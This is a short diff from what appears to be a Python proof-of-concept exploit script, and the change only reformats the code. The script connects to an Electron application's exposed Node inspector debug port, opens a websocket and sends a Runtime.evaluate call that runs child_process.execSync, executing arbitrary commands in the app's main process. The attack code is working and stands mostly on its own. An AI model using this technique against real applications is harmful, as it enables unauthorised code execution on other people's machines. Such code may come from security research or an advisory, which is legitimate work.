@@ -344,13 +344,15 @@ debug_url = requests.get("http://127.0.0.1:9229/json").json()[0]["webSocketDebug
 ws = websocket.create_connection(debug_url)
 
 # Execute arbitrary code in the Electron main process
-ws.send(json.dumps({
-    "id": 1,
-    "method": "Runtime.evaluate",
-    "params": {
-        "expression": "require('child_process').execSync('id').toString()"
-    }
-}))
+ws.send(
+    json.dumps(
+        {
+            "id": 1,
+            "method": "Runtime.evaluate",
+            "params": {"expression": "require('child_process').execSync('id').toString()"},
+        }
+    )
+)
 
 result = json.loads(ws.recv())
 print(result["result"]["result"]["value"])
